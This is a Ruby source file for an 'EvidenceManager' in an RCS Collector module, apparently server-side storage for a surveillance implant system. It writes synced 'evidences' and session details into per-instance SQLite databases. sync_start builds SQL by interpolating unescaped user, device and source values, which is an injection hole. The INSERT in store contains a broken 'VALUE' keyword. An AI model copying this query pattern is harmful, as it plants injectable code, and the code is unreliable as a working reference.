#
#  Pusher module for sending evidences to the database
#

# relatives
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'singleton'

module RCS
module Collector

class EvidenceManager
  include Singleton
  include RCS::Tracer

  REPO_DIR = Dir.pwd + '/evidences'

  SYNC_IDLE = 0
  SYNC_IN_PROGRESS = 1
  SYNC_TIMEOUTED = 2

  def sync_start(session, version, user, device, source, time)

    # notify the database that the sync is in progress
    DB.instance.sync_for session[:bid], version, user, device, source, time

    # create the repository for this instance
    return unless create_repository session[:instance]

    trace :info, "[#{session[:instance]}] Sync is in progress..."

    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + session[:instance])
      db.execute("DELETE FROM info;")
      db.execute("INSERT INTO info VALUES (#{session[:bid]},
                                           '#{session[:build]}',
                                           '#{session[:instance]}',
                                           '#{session[:subtype]}',
                                           #{version},
                                           '#{user}',
                                           '#{device}',
                                           '#{source}',
                                           #{time.to_i},
                                           #{SYNC_IN_PROGRESS});")
      db.close
    rescue Exception => e
      trace :warn, "Cannot insert into the repository: #{e.message}"
    end
  end

  def sync_timeout(session)
    # sanity check
    return unless File.exist?(REPO_DIR + '/' + session[:instance])

    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + session[:instance])
      # update only if the status in IN_PROGRESS
      # this will prevent erroneous overwrite of the IDLE status
      db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE bid = #{session[:bid]} AND sync_status = #{SYNC_IN_PROGRESS};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
    trace :info, "[#{session[:instance]}] Sync has been timeouted"
  end

  def sync_end(session)
    # sanity check
    return unless File.exist?(REPO_DIR + '/' + session[:instance])
        
    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + session[:instance])
      db.execute("UPDATE info SET sync_status = #{SYNC_IDLE} WHERE bid = #{session[:bid]};")
      db.close
    rescue Exception => e
      trace :warn, "Cannot update the repository: #{e.message}"
    end
    trace :info, "[#{session[:instance]}] Sync ended"
  end

  def store(session, size, content)
    # sanity check
    raise "No repository for this instance" unless File.exist?(REPO_DIR + '/' + session[:instance])

    # store the evidence
    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + session[:instance])
      db.execute("INSERT INTO evidences (size, content) VALUE (#{size}, ? );", SQLite3::Blob.new(content))
      db.close
    rescue Exception => e
      trace :warn, "Cannot insert into the repository: #{e.message}"
      raise "Cannot save evidence"
    end
  end

  def get_info(instance)
    # sanity check
    return unless File.exist?(REPO_DIR + '/' + instance)
            
    begin
      db = SQLite3::Database.open(REPO_DIR + '/' + instance)
      db.results_as_hash = true
      ret = db.execute("SELECT * FROM info;")
      db.close
      return ret.first
    rescue Exception => e
      trace :warn, "Cannot read from the repository: #{e.message}"
    end
  end

  def create_repository(instance)
    # ensure the repository directory is present
    Dir::mkdir(REPO_DIR) if not File.directory?(REPO_DIR)

    trace :info, "Creating repository for [#{instance}]"
    
    # create the repository
    begin
      db = SQLite3::Database.new REPO_DIR + '/' + instance
    rescue Exception => e
      trace :error, "Problems creating the repository file: #{e.message}"
      return false
    end

    # the schema of repository
    schema = ["CREATE TABLE IF NOT EXISTS info (bid INT,
                                  build CHAR(16),
                                  instance CHAR(40),
                                  subtype CHAR(16),
                                  version INT,
                                  user CHAR(256),
                                  device CHAR(256),
                                  source CHAR(256),
                                  sync_time INT,
                                  sync_status INT)",
              "CREATE TABLE IF NOT EXISTS evidences (id INTEGER PRIMARY KEY ASC,
                                                     size INT,
                                                     content BLOB)"
             ]

    # create all the tables
    schema.each do |query|
      begin
        db.execute query
      rescue Exception => e
        trace :error, "Cannot execute the statement : #{e.message}"
        db.close
        return false
      end
    end

    db.close

    return true
  end

  def run(options)
    return 1
  end

  # executed from rcs-collector-status
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
      end
    end

    #TODO: implement command line parsing

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      # Set a banner, displayed at the top of the help screen.
      opts.banner = "Usage: rcs-collector-status [options] [instance]"

      # Define the options, and what they do
      opts.on( '-i', '--instance INSTANCE', String, 'Show statistics only for this INSTANCE' ) do |inst|
        options[:instance] = inst
      end

      # This displays the help screen
      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # execute the manager
    return EvidenceManager.instance.run(options)
  end

end #Pusher

end #Collector::
end #RCS::